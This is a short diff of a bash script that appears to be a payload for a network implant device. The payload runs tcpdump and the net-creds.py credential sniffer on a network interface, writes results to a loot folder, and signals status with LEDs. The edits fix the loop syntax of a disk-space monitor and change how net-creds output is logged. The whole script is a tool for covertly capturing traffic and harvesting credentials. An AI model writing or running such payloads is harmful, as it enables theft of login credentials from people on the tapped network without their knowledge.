@@ -26,8 +26,9 @@ netcredsLog="net-creds_$Date.txt"
 
 function monitor_space() {
 	while true
-	[ -d "/proc/${1}" ] && echo "Payload running" >> $lootPath/log.txt || echo "Payload Not running" >> $lootPath/log.txt
 	do
+		# [ -d "/proc/${1}" ] && echo "Payload running" >> $lootPath/log.txt || echo "Payload Not running" >> $lootPath/log.txt
+
 		[[ $(df | grep /mnt | awk '{print $4}') -lt 10000 ]] && {
 			kill $1
 			LED FAIL
@@ -81,7 +82,7 @@ function run() {
 	echo "TCPDump started pid=$tpid" >> $lootPath/log.txt
 
 	# Start net-creds data
-	python $DIR/net-creds.py -i $interface -o $lootPath/$netcredsLog > $lootPath/net-creds.txt 2> $lootPath/net-creds-error.txt &
+	python $DIR/net-creds.py -i $interface -o $lootPath/$netcredsLog &
   netcredsid=$!
 
 	# Log net-creds Start.
